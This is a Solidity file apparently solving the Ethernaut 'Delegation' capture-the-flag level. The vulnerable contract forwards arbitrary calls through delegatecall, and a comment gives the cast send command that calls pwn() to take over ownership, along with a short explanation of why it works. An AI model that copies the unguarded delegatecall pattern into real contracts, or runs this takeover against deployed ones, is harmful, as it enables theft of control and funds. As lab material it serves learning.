// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {
    address public owner;
    Delegate delegate;

    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    fallback() external {
        (bool result, ) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
        }
    }
}

/**
cast send $INSTANCE "pwn()()" --rpc-url $OP_SEP_RPC --private-key $WALLET_PK --gas-limit $(cast estimate $INSTANCE "pwn()()" --rpc-url $OP_SEP_RPC)


delegatecall executes the target contract in the context of the calling contract. So all storage modifications are done in the state of the calling contract.
*/
